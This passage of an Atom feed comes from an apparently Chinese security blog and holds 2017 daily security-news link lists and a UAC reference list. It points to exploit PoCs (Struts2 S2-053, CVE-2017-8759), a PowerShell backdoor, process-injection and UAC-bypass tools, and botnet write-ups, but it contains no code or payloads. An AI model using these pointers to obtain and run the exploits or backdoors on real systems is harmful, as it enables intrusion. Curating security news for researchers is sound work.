<li>使用D-Link路由器构建僵尸网络<br><a href="https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin" target="_blank" rel="external">https://embedi.com/blog/enlarge-your-botnet-top-d-link-routers-dir8xx-d-link-routers-cruisin-bruisin</a></li>
<li><p>InjectProc - 进程注入工具<br><a href="https://github.com/secrary/InjectProc" target="_blank" rel="external">https://github.com/secrary/InjectProc</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">好像没什么新奇的，还是基于CreateRemoteThread()函数的。</div></pre></td></tr></table></figure>
</li>
<li><p>ThunderShell - 基于 Powershell 实现的后门<br><a href="https://github.com/Mr-Un1k0d3r/ThunderShell" target="_blank" rel="external">https://github.com/Mr-Un1k0d3r/ThunderShell</a></p>
</li>
<li>Apache Struts2 Remote Code Execution (S2-053)<br><a href="http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/" target="_blank" rel="external">http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/</a></li>
<li>MIPS 初探<br><a href="https://mp.weixin.qq.com/s?__biz=MzIxNjU3ODMyOQ==&amp;mid=2247483677&amp;idx=1&amp;sn=a6df6660510f610aa57bc1127457f9d0" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzIxNjU3ODMyOQ==&amp;mid=2247483677&amp;idx=1&amp;sn=a6df6660510f610aa57bc1127457f9d0</a></li>
<li>Xposed知多少？<br><a href="http://www.freebuf.com/column/147856.html" target="_blank" rel="external">http://www.freebuf.com/column/147856.html</a></li>
<li>PHP漏洞挖掘——进阶篇<br><a href="http://blog.nsfocus.net/php-vulnerability-mining/" target="_blank" rel="external">http://blog.nsfocus.net/php-vulnerability-mining/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Windows for Linux Nerds&lt;br&gt;&lt;a href=&quot;https://blog
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>win64逆向</title>
    <link href="http://kevien.github.io/2017/09/14/win64%E9%80%86%E5%90%91/"/>
    <id>http://kevien.github.io/2017/09/14/win64逆向/</id>
    <published>2017-09-14T14:14:58.000Z</published>
    <updated>2017-09-18T09:20:08.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>UAC原理</title>
    <link href="http://kevien.github.io/2017/09/14/UAC%E5%8E%9F%E7%90%86/"/>
    <id>http://kevien.github.io/2017/09/14/UAC原理/</id>
    <published>2017-09-14T05:35:42.000Z</published>
    <updated>2017-09-14T10:53:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>Reference:<br><a href="https://technet.microsoft.com/zh-cn/library/mt437605(v=vs.85" target="_blank" rel="external">用户帐户控制的工作原理</a>.aspx)<br><a href="http://xiangwangfeng.com/2010/10/20/UAC%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F/" target="_blank" rel="external">UAC的前世今生</a><br><a href="http://www.cnblogs.com/Chesky/p/UAC_Bypass.html" target="_blank" rel="external">UAC 实现原理及绕过方法</a><br><a href="http://www.mottoin.com/90755.html" target="_blank" rel="external">UAC攻击剖析</a><br><a href="http://bobao.360.cn/learning/detail/420.html" target="_blank" rel="external">Dridex使用的一种新型UAC绕过方法</a><br><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="external">UACME</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Reference:&lt;br&gt;&lt;a href=&quot;https://technet.microsoft.com/zh-cn/library/mt437605(v=vs.85&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;用户帐户控制的工作原理&lt;/a&gt;.aspx)
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170914安全动态</title>
    <link href="http://kevien.github.io/2017/09/14/20170914%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/14/20170914安全动态/</id>
    <published>2017-09-14T02:28:40.000Z</published>
    <updated>2017-09-14T14:26:50.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>RHme3 CTF 一道 UAF 题的 Writeup<br><a href="https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580" target="_blank" rel="external">https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580</a></li>
<li>昨天推送的 Microsoft Office RTF WSDL Parser 野外被利用 0Day 的 PoC：<a href="https://github.com/Voulnet/CVE-2017-8759-Exploit-sample" target="_blank" rel="external">https://github.com/Voulnet/CVE-2017-8759-Exploit-sample</a><br><a href="https://github.com/vysec/CVE-2017-8759" target="_blank" rel="external">https://github.com/vysec/CVE-2017-8759</a></li>
<li>上周推送过 FireEye 一篇监控 Windows Console 活动的 Blog，有位研究员根据 Blog 自己实现了一个工具<br><a href="https://github.com/EyeOfRa/WinConMon" target="_blank" rel="external">https://github.com/EyeOfRa/WinConMon</a></li>
<li>利用 PHP Sessions 文件将 LFI 漏洞升级为 RCE<br><a href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions" target="_blank" rel="external">https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions</a></li>
<li>Use DNS Rebinding to Bypass SSRF in Java<br><a href="https://paper.seebug.org/390/" target="_blank" rel="external">https://paper.seebug.org/390/</a></li>
<li>Linux Hacking Tools 收集<br><a href="http://pastebin.com/raw/qeHD8j92" target="_blank" rel="external">http://pastebin.com/raw/qeHD8j92</a></li>
<li>Ruby ERB 模板注入攻击<br><a href="https://www.trustedsec.com/2017/09/rubyerb-template-injection/" target="_blank" rel="external">https://www.trustedsec.com/2017/09/rubyerb-template-injection/</a></li>
<li>IoT设备固件分析教程之固件是怎么存储的<br><a href="https://mp.weixin.qq.com/s/kANceRdTAocCRpkCB1lsjQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/kANceRdTAocCRpkCB1lsjQ</a></li>
<li>绕过UAC系列之 SDCLT的利用<br><a href="https://zhuanlan.zhihu.com/p/29325846" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/29325846</a></li>
<li>DownAndExec：银行恶意软件利用巴西的CDN传播（CDN已经成为传播恶意软件的新方法）<br><a href="https://www.welivesecurity.com/2017/09/13/downandexec-banking-malware-cdns-brazil/" target="_blank" rel="external">https://www.welivesecurity.com/2017/09/13/downandexec-banking-malware-cdns-brazil/</a></li>
<li>S2-053<br><a href="http://vinc.top/2017/09/14/%E3%80%90struts2%E3%80%91s2-053/" target="_blank" rel="external">http://vinc.top/2017/09/14/%E3%80%90struts2%E3%80%91s2-053/</a></li>
<li>我是怎样一步一步实现微信自动抢红包的？<br><a href="http://bbs.iosre.com/t/topic/9529/4" target="_blank" rel="external">http://bbs.iosre.com/t/topic/9529/4</a></li>
<li>从PHP源码与扩展开发谈PHP任意代码执行与防御  php安全<br><a href="https://blog.zsxsoft.com/post/30" target="_blank" rel="external">https://blog.zsxsoft.com/post/30</a></li>
<li>【技术分享】如何构建安全的API（part1）<br><a href="http://bobao.360.cn/learning/detail/4394.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4394.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;RHme3 CTF 一道 UAF 题的 Writeup&lt;br&gt;&lt;a href=&quot;https://
    
    </summary>
    
    
  </entry>
  
</feed>
